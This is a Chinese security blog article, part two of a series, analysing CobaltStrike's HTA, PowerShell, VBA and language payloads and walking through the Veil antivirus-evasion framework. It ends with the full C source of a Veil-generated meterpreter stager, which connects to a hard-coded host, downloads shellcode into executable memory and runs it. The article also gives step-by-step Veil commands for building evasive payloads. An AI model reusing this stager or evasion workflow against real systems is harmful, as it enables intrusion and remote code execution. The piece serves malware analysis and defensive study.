> 原文链接: https://www.anquanke.com//post/id/231410 


# 透视CobaltStrike（二）——从CS到免杀框架Veil


                                阅读量   
                                **197696**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p1.ssl.qhimg.com/t0143994605f2f662e3.jpg)](https://p1.ssl.qhimg.com/t0143994605f2f662e3.jpg)



## 概述

在上一节的的文章了，笔者对CobaltStrike的基本使用和PE样本进行了一个概要的分析。通过上一小节的内容，可了解CobaltStrike的基本原理和代码解密上线方法。在本节中，笔者将会对CobaltStrike其他类型的恶意样本进行一个分析。

由于foreign协议和beacon协议生成的样本解码方式相同，只是后续请求的方式不同，这里就不分开介绍了，只介绍beacon类型的样本。



## HTML Application

CobaltStrike可生成三种类型的hta文件，分别是Executable、Powershell、VBA。

[![](https://p5.ssl.qhimg.com/t019e3c0bd790af55ff.png)](https://p5.ssl.qhimg.com/t019e3c0bd790af55ff.png)

这三类样本的区别在于：

Executable 将会在hta文件中内嵌一个PE文件<br>
Powershell 将会在hta文件中内嵌一段Powershell代码<br>
VBA 将会在hta文件中内嵌一段VBA代码

### <a class="reference-link" name="Beacon_Executable"></a>Beacon_Executable

该类样本主要是创建一个包含VBScript的hta文件，在VBScript中，有一个硬编码的PE

[![](https://p4.ssl.qhimg.com/t019261fc5e165807a5.png)](https://p4.ssl.qhimg.com/t019261fc5e165807a5.png)

脚本会在末尾将shellcode写入到evil_pe.exe中并通过Wscript.Shell加载执行

[![](https://p5.ssl.qhimg.com/t01bfaa2f68bfe77e77.png)](https://p5.ssl.qhimg.com/t01bfaa2f68bfe77e77.png)

因此可以将这部分的shellcode赋值到010中保存为exe文件：

[![](https://p3.ssl.qhimg.com/t01a5b13713269f7725.png)](https://p3.ssl.qhimg.com/t01a5b13713269f7725.png)

保存出来的pe是只有14kb，初步估计是上一小节分析过的加载器。

[![](https://p2.ssl.qhimg.com/t011a2c5adb3cef051b.png)](https://p2.ssl.qhimg.com/t011a2c5adb3cef051b.png)

经过分析，可以确定该样本是CobaltStrike的的分段Payload加载器

[![](https://p0.ssl.qhimg.com/t015a63f384236cb849.png)](https://p0.ssl.qhimg.com/t015a63f384236cb849.png)

### <a class="reference-link" name="Powershell"></a>Powershell

相比之下，Powershell类型的hta内嵌的shellcode体积就要小很多

[![](https://p4.ssl.qhimg.com/t01b8b9ba6831e20e39.png)](https://p4.ssl.qhimg.com/t01b8b9ba6831e20e39.png)

该段Powershell代码主要是用于解密并执行中间一段base64编码的代码，中间的代码解码之后如下：

[![](https://p1.ssl.qhimg.com/t018a1d8f5edefd8a1b.png)](https://p1.ssl.qhimg.com/t018a1d8f5edefd8a1b.png)

解码之后的Powershell依旧是解码执行base64编码的代码，不同的是，此次解码出来的将会是一个数据流，在后面解压缩执行。

所以可以将该段Powershell指令赋值到ps中执行，得到执行结果。

[![](https://p0.ssl.qhimg.com/t01c7a4ae609f73de3d.png)](https://p0.ssl.qhimg.com/t01c7a4ae609f73de3d.png)

最后的这段Powershell代码首先会在末尾处通过[IntPtr]::size -eq 8 以判断当前的操作系统是32还是64位。若当前程序是64位，则以32位的模式启动。

这里调试ps1文件，直接将shellcode写入到2.txt中：

[![](https://p0.ssl.qhimg.com/t0150405669895c425e.png)](https://p0.ssl.qhimg.com/t0150405669895c425e.png)

写入到1.txt中的内容还是一段Powershell指令，代码如下：

[![](https://p0.ssl.qhimg.com/t011448fd772b0cb0fc.png)](https://p0.ssl.qhimg.com/t011448fd772b0cb0fc.png)

写入之后格式如下，写个简单的python脚本格式化即可

[![](https://p1.ssl.qhimg.com/t017ed8939cee6cdd6b.png)](https://p1.ssl.qhimg.com/t017ed8939cee6cdd6b.png)

格式化出来之后可以发现这里的shellcode其实就是分段Payload中解密出来用于下载后续Payload的shellcode

[![](https://p4.ssl.qhimg.com/t012030a2dd7a9f85d4.png)](https://p4.ssl.qhimg.com/t012030a2dd7a9f85d4.png)

### <a class="reference-link" name="VBA"></a>VBA

内嵌VBA代码的hta相比前两类就要复杂一些

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01df93f50779e5b8bf.png)

VBA类的hta主要是在hta中通过VBScript创建一个excel对象并填充恶意宏代码执行。

代码首先通过CreateBoject 创建了一个 Excel.Application对象并更改其可见属性为False

[![](https://p1.ssl.qhimg.com/t01d1a3159f87bd1861.png)](https://p1.ssl.qhimg.com/t01d1a3159f87bd1861.png)

接着程序创建一个WscriptShell对象用于操作注册表，主要是添加宏的安全属性

[![](https://p4.ssl.qhimg.com/t01be4f9f8b4b59a1c8.png)](https://p4.ssl.qhimg.com/t01be4f9f8b4b59a1c8.png)

准备工作完成之后，程序会给Excel对象添加工作表并且将宏代码填充进去：

[![](https://p3.ssl.qhimg.com/t01f2be779547a2bb65.png)](https://p3.ssl.qhimg.com/t01f2be779547a2bb65.png)

最后通过Auto_Open方法调用宏：

[![](https://p2.ssl.qhimg.com/t014745698590749f35.png)](https://p2.ssl.qhimg.com/t014745698590749f35.png)

所以可以直接在excel中创建一个宏对象，将hat文件中的宏代码拷贝过去调试，记得位置需要选择到当前的文档，而不是应用到所有模板

[![](https://p2.ssl.qhimg.com/t01ca6c168f4ef6174b.png)](https://p2.ssl.qhimg.com/t01ca6c168f4ef6174b.png)

但是将宏代码插入到excel之前需要先把一些没用的代码给替换掉，原始代码如下，经过简单分析，可以知道每个符号分别应该替换为多少，并且直接将cha(xx)的形式替换为对应的符号，这个过程可以手动替换，也可以直接编写一个python脚本进行替换。

[![](https://p5.ssl.qhimg.com/t0161e710aaaafcb6e6.png)](https://p5.ssl.qhimg.com/t0161e710aaaafcb6e6.png)

完全替换并格式化后的宏代码应该如下：

[![](https://p3.ssl.qhimg.com/t0193680484615b1c50.png)](https://p3.ssl.qhimg.com/t0193680484615b1c50.png)

简单分析后可得知，宏代码中应该是编码了一段hex数据流，宏代码会将这段数据流读解码后读取到内存并通过rundll32加载执行

[![](https://p5.ssl.qhimg.com/t011621bb086dc80392.png)](https://p5.ssl.qhimg.com/t011621bb086dc80392.png)

加载方式是直接写入内存

[![](https://p5.ssl.qhimg.com/t01305bc0b77e270dfc.png)](https://p5.ssl.qhimg.com/t01305bc0b77e270dfc.png)

所以可以调试到 res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0) 的时候使用火绒剑查看rundll32.exe的进程信息，找到写入的进程地址，本例中为851968，将其转换为16进制得到d0000

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01ec0058a5c38a4a2f.png)

获取到写入的地址之后，可以直接在火绒剑里面右键，查看进程信息，转到线程，双击之后，在内存查看窗口中输入转换后的十六进制地址：d0000查看内存

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01e2d39bc374949f74.png)

跳转过来之后可以发现，这片内存的数据就是我们之前分析过的shellcode。由于火绒剑本身不带有内存dump的功能，想要dump这片内存可以使用其他的内存dump工具。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01c8b134b061a1c676.png)



## Payload

除了直接生成恶意样本，CobaltStrike还支持生成各种语言的Payload，包括了C、C#、Java、Python等常见语言

[![](https://p1.ssl.qhimg.com/t015eee9340c2688250.png)](https://p1.ssl.qhimg.com/t015eee9340c2688250.png)

其中C、C#、JAVA、Perl、Python、Ruby、VBA等类型的Payload均为硬编码的shellcode，而这段shellcode之前已经看到过不止一次了。攻击者可以编写任意的加载器，将这段buf加载到内存中执行。

[![](https://p3.ssl.qhimg.com/t01ce6ef177a9356c07.png)](https://p3.ssl.qhimg.com/t01ce6ef177a9356c07.png)

COM组件的sct文件和上面分析的HTML APPlication的VBA相似，均为创建一个excel对象将预定义的宏代码写入进去执行：

[![](https://p0.ssl.qhimg.com/t0121399c264a5713fa.png)](https://p0.ssl.qhimg.com/t0121399c264a5713fa.png)

同样的，Powershell类型的Payload跟hta类型的Powershell解码出来保持一致：

[![](https://p0.ssl.qhimg.com/t01f73d7d0f15a3c400.png)](https://p0.ssl.qhimg.com/t01f73d7d0f15a3c400.png)

Powershell_cmd类型的Payload会直接生成一行可执行的Powershell指令，该条指令用于执行一段base64编码的指令

[![](https://p4.ssl.qhimg.com/t01b9ef1db64d235e50.png)](https://p4.ssl.qhimg.com/t01b9ef1db64d235e50.png)

该段base64解码之后还是一段Powershell指令，该段Powershell指令依旧用于执行base64编码后的指令

[![](https://p1.ssl.qhimg.com/t0100c4a971eb9a00ad.png)](https://p1.ssl.qhimg.com/t0100c4a971eb9a00ad.png)

内层的base64字符串解码之后是一段压缩后的shellcode，程序会通过IO.Compression.GzipStream解压缩这段数据通过IEX加载执行，这和hta的Powershell保持一致。

[![](https://p3.ssl.qhimg.com/t01074c666e545faf1e.png)](https://p3.ssl.qhimg.com/t01074c666e545faf1e.png)

至此，除Veil之外，CobaltStrike生成的所有Payload都已经看完，通过对各种payload的简单分析可以得知，CobaltStrike看起来可以生成多种类型的payload，但其实本质上，payload所加载的shellcode其实是基本都是cs的downloader。



## Veil

在上一小节介绍了CobaltStrike生成的各类payload，唯独没有介绍Veil，是因为Veil并不是可直接投入使用的语言，而是一款和CobaltStrike配合使用的免杀框架。

CobaltStrike客户端可以生成Veil类型的payload，攻击者将该Payload传入到Veil框架中即可生成具有一定免杀性的样本。

在kali中安装Veil只需要在确保配置的源可用的情况下执行apt -y install veil 即可快速安装

安装之后执行/usr/share/veil/config/setup.sh —force —silent 进行配置：

[![](https://p3.ssl.qhimg.com/t01b6f279d3a21b88da.png)](https://p3.ssl.qhimg.com/t01b6f279d3a21b88da.png)

配置完成，在命令行输入veil指令就可进入到Veil：

[![](https://p5.ssl.qhimg.com/t01c961a6bea9cdf020.png)](https://p5.ssl.qhimg.com/t01c961a6bea9cdf020.png)

Veil主要是包含了Evasion和Ordnance两个免杀工具，其中Evasion是用作文件免杀，Ordnance可生成一段Veil的Shellcode。接下来将以一个简单的例子讲述Veil框架的样本生成：

### <a class="reference-link" name="Make%20Veil%20for%20Autoit"></a>Make Veil for Autoit

在命令行键入use 1选择Evasion工具，可查看Evasion支持的一些命令，其中list指令可列举出Evasion包含的所有类型的Payload，use指令可选择Payload，info 指令可查看Payload的相信信息。

[![](https://p1.ssl.qhimg.com/t01ad50519d79ec3754.png)](https://p1.ssl.qhimg.com/t01ad50519d79ec3754.png)

键入list命令查看可配置的Payload列表

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01133cc359b00da08c.png)

Veil的Evasion一共包含了41中Payload，其中包括autoit的shellcode注入、meterpreter后门、cs后门、golang版本的meterpreter后门、lua的shellcode注入、perl的shellcode注入、Powershell版本的meterpreter后门、python版<br>
本的meterpreter后门、python的shellcode注入、ruby的meterpreter后门、ruby的shellcode注入等等。

键入info 1 或者info autoit/shellcode_inject/flat.py 可查看第一类Payload的详细信息：

[![](https://p5.ssl.qhimg.com/t0158f35a7b61111a9c.png)](https://p5.ssl.qhimg.com/t0158f35a7b61111a9c.png)

根据回显信息可知，autoit的Payload可直接编译成可执行文件。所以键入use 1 生成一个autoit的Payload试试

[![](https://p2.ssl.qhimg.com/t0130660e0fee779fb6.png)](https://p2.ssl.qhimg.com/t0130660e0fee779fb6.png)

键入generate准备生成样本，Evasion提供了5种方式的shellcode，分别是
1. Ordnance(默认)
1. MSFVenom (MSF的Payload)
1. Custom shellcode String (自定义的shellcode)
1. File With Shellcode(十六进制的shellcode文件)
1. Binary file with shellcode(二进制形式的shellcode文件)
这里看看Veil框架自带的样本，于是键入1，选择默认方式生成，接下来程序会让用户选择直接生成原始payload还是生成编码后的payload

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01bf286ce051ffa4c4.png)

而这里的Encoders其实只有一个xor方式

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01f2e773558706acc2.png)

为了对比生成的shellcode情况，这里键入use 6 选择不进行编码，可以看到坏字符为\x00，无编码方式，接下来只设置好lhost和lport之后，键入generate即可生成payload

[![](https://p2.ssl.qhimg.com/t012e008646226f3624.png)](https://p2.ssl.qhimg.com/t012e008646226f3624.png)

最后键入文件名，即可在Veil的文件目录下生成对应的exe文件：

[![](https://p4.ssl.qhimg.com/t01aa02f0bbcc0d3818.png)](https://p4.ssl.qhimg.com/t01aa02f0bbcc0d3818.png)

### <a class="reference-link" name="Veil%20Autoit"></a>Veil Autoit

通过工具解析这个pe文件，将autoit脚本dump出来如下：

[![](https://p4.ssl.qhimg.com/t019fe30581a8c478d0.png)](https://p4.ssl.qhimg.com/t019fe30581a8c478d0.png)

Autoit脚本本身较短，主要就是将先前在Veil控制台生成的那段shellcode注入到calc.exe中

Veil默认生成的shellcode和上一小节cs的shellcode风格类似，但是短小了很多

[![](https://p1.ssl.qhimg.com/t011234a73eedc93689.png)](https://p1.ssl.qhimg.com/t011234a73eedc93689.png)

经过快速的验证可以得知，该段shellcode就是CobaltStrike中用于下载后续payload的shellcode：

[![](https://p2.ssl.qhimg.com/t0122866c0368ed8dfd.png)](https://p2.ssl.qhimg.com/t0122866c0368ed8dfd.png)

回到Veil框架中来，刚才在生成autoit的样本时候，Veil提供了五个选项用于生成不同的shellcode，上面经过试验可知Veil默认的shellcode和CobaltStrike中对应，接下来看看MSFvenom选项的shellcode。

在配置shellcode时候选择 2- MSFVenom，选择msf的shellcode，根据提示键入对应的信息，最后程序会生成一个名为payload1.exe的利用文件：

[![](https://p4.ssl.qhimg.com/t01b910821aacbc2823.png)](https://p4.ssl.qhimg.com/t01b910821aacbc2823.png)

将msfvenom方式生成的样本dump出来，发现注入方式相同，但是注入的shellcode有所改变

[![](https://p4.ssl.qhimg.com/t01ea5368798118d3fe.png)](https://p4.ssl.qhimg.com/t01ea5368798118d3fe.png)

msfvenom的shellcode和CobaltStrike的基本一样，但是感觉要稳定一些

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t014e8abdf325e91fa0.png)

关于MSF的shellcode为什么和CobaltStrike的shellcode如此相似，笔者会在下一篇文章中进行详细的介绍。

由于2 3 4 三个选项都需要payload作为输入，这个暂且不进行分析。从选项5到选项8，均为c语言的meterpreter

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0119f7dbaae3f36d74.png)

### <a class="reference-link" name="Veil2meterpreter"></a>Veil2meterpreter

选择c/meterpreter ，Veil自动配置好了LPORT，需要用户手动键入LHOST和Filename。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t014e08ee00cde363d1.png)

配置完成之后，生成payload的时候，Veil会自动创建源代码文件和可执行文件，分别放入compiled文件夹和source文件夹中。

打开source文件夹中的use5.exe.c可看到该payload生成的C语言源码：

[![](https://p2.ssl.qhimg.com/t0156680c8f6c6095f5.png)](https://p2.ssl.qhimg.com/t0156680c8f6c6095f5.png)

格式化之后完整代码如下

```
#define _WIN32_WINNT 0x0500
#include &lt;winsock2.h&gt;
#include &lt;time.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;windows.h&gt;
#include &lt;string.h&gt;
char* HTzuNvhCcP(char* s)
`{`
    char *result =  malloc(strlen(s)*2+1);
    int i;
    for (i=0;i&lt;strlen(s)*2+1;i++)
    `{`
        result[i] = s[i/2];
        result[i+1]=s[i/2];
    `}` 
    result[i] = '\0';
    return result;
`}`

char* OySGHDw(const char *t) 
`{`
    int length= strlen(t);
    int i;
    char* t2 = (char*)malloc((length+1) * sizeof(char));
    for(i=0;i&lt;length;i++)
    `{`
        t2[(length-1)-i]=t[i];
    `}` 
    t2[length] = '\0';
    return t2;
`}`

int xDEADohLQOWAzHd(char PRgNjrnBFiTU[]) 
`{`
    int ALonTwgUnqVHeP=0;
    int i;
    for (i=0;i&lt;strlen(PRgNjrnBFiTU);++i)
        ALonTwgUnqVHeP += PRgNjrnBFiTU[i];
    return (ALonTwgUnqVHeP % 256); 
`}`

void MzItUPnp() 
`{`
    WORD pYUkbOS = MAKEWORD((0*4+2), (2*1+0));
    WSADATA euQsZxqczZN;
    if (WSAStartup(pYUkbOS, &amp;euQsZxqczZN) &lt; 0) 
    `{`
        WSACleanup();
        exit(1);
    `}`
`}`


char* OZNtVHUJ()
`{` 
    char EqafcdrUDe[2322], lchzXusA[2322/2];
    strcpy(EqafcdrUDe,"KsdJVurnXCZwEPwiYxMkTesCJnIcBzpzkbpihXhtoIKlPqSowe");
    strcpy(lchzXusA,"WbxKqlvywkBPPFOwqjvVDYWNHzeRElhmgzEVedFMzzZIbLNYbN");
    return OySGHDw(strcat( EqafcdrUDe, lchzXusA));
`}`

void MxzrqhwCGD(SOCKET HpKFhGTt) 
`{`
    closesocket(HpKFhGTt);
    WSACleanup();
    exit(1);
`}`

char* ezkJzCUX()
`{`
    char *FoteTKotVa = HTzuNvhCcP("ntHkjiirjivMQLRcvIHfhkPRwprXXDMVwVCXKmYXzGjTKGqYtB");
    return strstr( FoteTKotVa, "p" );
`}`

char* XqleexaJmujm()
`{`
    srand (time(NULL));
    int i;
    char jXDHwTYg[] = "NpDPygsCZFz0fIlSQAO2c4xrb6vJYiWXGm1TVw3udUnkKa9EtBMLHjqheR58o7";
    char* bMKWmB = malloc(5);
    bMKWmB[4] = 0;
    while (1&lt;2)
    `{`
        for(i=0;i&lt;3;++i)
        `{`
            bMKWmB[i] = jXDHwTYg[rand() % (sizeof(jXDHwTYg)-1)];
        `}`
        for(i=0;i&lt;sizeof(jXDHwTYg);i++)
        `{`
            bMKWmB[3] = jXDHwTYg[i];
            if (xDEADohLQOWAzHd(bMKWmB) == 92) 
                return bMKWmB;
        `}`
    `}` return 0;
`}`

char* UQVVQa() 
`{` 
    char qofPBDITdyn[2322] = "QvAaOpKBiWlPPVDkezMgBtoUdUNQHsYSwKTqHAorZOwQkXnYjr";
    char *FBvxORWoFORw = strupr(qofPBDITdyn);
    return strlwr(FBvxORWoFORw);
`}`

SOCKET rGEiHkVJYjGbir() 
`{` 
    struct hostent * Iaedcj;
    struct sockaddr_in XIHDAdziTSd;
    SOCKET rrlyFfRiscWV;
    rrlyFfRiscWV = socket(AF_INET, SOCK_STREAM, 0);
    if (rrlyFfRiscWV == INVALID_SOCKET) 
        MxzrqhwCGD(rrlyFfRiscWV);
    Iaedcj = gethostbyname("192.168.230.129");
    if (Iaedcj == NULL) 
        MxzrqhwCGD(rrlyFfRiscWV);
    memcpy(&amp;XIHDAdziTSd.sin_addr.s_addr, Iaedcj-&gt;h_addr, Iaedcj-&gt;h_length);
    XIHDAdziTSd.sin_family = AF_INET;
    XIHDAdziTSd.sin_port = htons((673*12+4));
    if ( connect(rrlyFfRiscWV, (struct sockaddr *)&amp;XIHDAdziTSd, sizeof(XIHDAdziTSd)) ) 
        MxzrqhwCGD(rrlyFfRiscWV);
 return rrlyFfRiscWV;
`}`

int main(int argc, char * argv[]) 
`{`
    char * EcQtTd;
    int i;
    char* YGADVFvMCa[5463];
    for (i = 0;i &lt; 5463;++i)
        YGADVFvMCa[i] = malloc (4182);
    MzItUPnp();
    char* WCficlPxKiWRYg[264];
    SOCKET mpmACD = rGEiHkVJYjGbir();
    for (i = 0;i &lt; 264;++i) 
        WCficlPxKiWRYg[i] = malloc (2850);
    char mwKObmvDwOIuJ[200];
    sprintf(mwKObmvDwOIuJ, "GET /%s HTTP/1.1\r\nAccept-Encoding: identity\r\nHost: 192.168.230.129:8080\r\nConnection: close\r\nUser-Agent: Mozilla/4.0 (compatible;MSIE 6.1;Windows NT\r\n\r\n", XqleexaJmujm());
    send(mpmACD,mwKObmvDwOIuJ, strlen( mwKObmvDwOIuJ ),0);
    Sleep(300);
    EcQtTd = VirtualAlloc(0, 1000000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    char* AGwAhuoOYGFoNzq[9887];
    for (i=0;i&lt;5463;++i)
    `{`
        strcpy(YGADVFvMCa[i], OZNtVHUJ());
    `}`
    char * umWSfvQxRu = EcQtTd;
    int XHuuVPORMriW;
    do 
    `{` 
        XHuuVPORMriW = recv(mpmACD, umWSfvQxRu, 1024, 0);
        umWSfvQxRu += XHuuVPORMriW;
    `}`while ( XHuuVPORMriW &gt; 0 );
    for (i = 0;i &lt; 9887;++i)
        AGwAhuoOYGFoNzq[i] = malloc (4361);
    for (i=0;i&lt;264;++i)
    `{`
        strcpy(WCficlPxKiWRYg[i], ezkJzCUX());
    `}`
    closesocket(mpmACD);
    WSACleanup();
    ((void (*)())strstr(EcQtTd, "\r\n\r\n") + 4)();
    for (i=0;i&lt;9887;++i)
    `{`
        strcpy(AGwAhuoOYGFoNzq[i], UQVVQa());
    `}`
    return 0;
`}`
```

由于 6 7 8三个选项只是请求协议不同，加载方式还是大同小异的，这里就不分别对后面的进行生成和分析了。

不过关于Veil生成的meterpreter还是比较有意思的，本文篇幅至此，若是下一篇有机会的话将其完整分析补上。
